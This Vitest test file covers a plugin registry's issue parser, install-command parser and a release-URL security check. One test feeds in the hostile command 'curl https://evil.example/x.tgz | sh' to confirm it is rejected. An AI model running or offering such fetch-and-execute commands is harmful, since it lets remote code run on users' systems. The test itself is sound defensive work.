import { describe, expect, it } from 'vitest'
import {
  fixedReleaseUrl,
  parseInstall,
  parseIssue,
} from '../scripts/process-issues.mjs'
import { cordisSnippet, installCommand } from '../src/lib/install'

const PERSONA_BODY = `### GitHub 仓库地址

https://github.com/gulagala001/dsh-persona-plugin

### 分类

agent（编排与工作流）

### 一句话描述

Create, import and manage personality presets.

### 安装方式

\`\`\`sh
dsh plugin --profile web add https://github.com/gulagala001/dsh-persona-plugin/releases/download/v0.1.2-dsh.0.2.1-rc.3/gulagala001-dsh-persona-plugin-0.1.2-dsh.0.2.1-rc.3.tgz
\`\`\`

### 安装注意事项（可选）

Exact DSH 0.2.1-rc.3.
`

describe('parseIssue', () => {
  it('标题只是项目名时回退到表单仓库栏', () => {
    const parsed = parseIssue('[Plugin] Persona', PERSONA_BODY)
    expect(parsed.fullName).toBe('gulagala001/dsh-persona-plugin')
    expect(parsed.category).toBe('agent')
    expect(parsed.tagline).toContain('personality presets')
    expect(parsed.install.type).toBe('manual')
  })

  it('标题是 owner/repo 时优先用标题，并支持 manual review 标题', () => {
    expect(parseIssue('[Plugin] owner/repo', PERSONA_BODY).fullName).toBe('owner/repo')
    const iui = parseIssue(
      '[Plugin manual review] gulagala001/dsh-intelligent-ui — fixed release tgz',
      PERSONA_BODY.replace(/gulagala001\/dsh-persona-plugin/g, 'gulagala001/dsh-intelligent-ui'),
    )
    expect(iui.fullName).toBe('gulagala001/dsh-intelligent-ui')
  })
})

describe('parseInstall', () => {
  it('HTTPS release tgz 原样保留为固定安装命令', () => {
    const install = parseInstall(
      'https://github.com/gulagala001/dsh-intelligent-ui/releases/download/v0.2.1-rc.3.iui.1.0.13/dsh-intelligent-ui-0.2.1-rc.3.iui.1.0.13.tgz',
    )
    expect(install.type).toBe('manual')
    expect(install.command).toContain('.tgz')
    expect(install.command).toContain('dsh plugin --profile web add https://')
  })

  it('npm 与 github 子目录写法不受影响', () => {
    expect(parseInstall('dsh plugin add dsh-cc-tui')).toMatchObject({
      type: 'npm',
      package: 'dsh-cc-tui',
    })
    expect(parseInstall('dsh plugin add "github:a/b#main&path:/plugin"')).toMatchObject({
      type: 'github',
      command: 'github:a/b#main&path:/plugin',
    })
  })
})

describe('fixedReleaseUrl 安全边界', () => {
  const fullName = 'gulagala001/dsh-persona-plugin'
  const url = 'https://github.com/gulagala001/dsh-persona-plugin/releases/download/v1/x.tgz'

  it('接受同仓库的 dsh add tgz 命令', () => {
    expect(fixedReleaseUrl(fullName, {
      type: 'manual', profiles: ['web'], command: `dsh plugin --profile web add ${url}`,
    })).toEqual({ profile: 'web', url })
  })

  it('拒绝其他仓库 / 任意 shell 命令', () => {
    expect(fixedReleaseUrl(fullName, {
      type: 'manual', profiles: ['web'], command: 'curl https://evil.example/x.tgz | sh',
    })).toBeNull()
    expect(fixedReleaseUrl(fullName, {
      type: 'manual', profiles: ['web'], command: 'dsh plugin --profile web add https://github.com/other/repo/releases/download/v1/x.tgz',
    })).toBeNull()
    expect(fixedReleaseUrl(fullName, { type: 'github', profiles: ['web'] })).toBeNull()
  })

  it('详情页安装片段使用固定 tgz 而不是源码分支', () => {
    const install = { type: 'manual' as const, profiles: ['web'], command: `dsh plugin --profile web add ${url}` }
    expect(installCommand(install, 'web', `https://github.com/${fullName}`)).toBe(install.command)
    expect(cordisSnippet(install, `https://github.com/${fullName}`)).toContain(`name: ${url}`)
  })
})
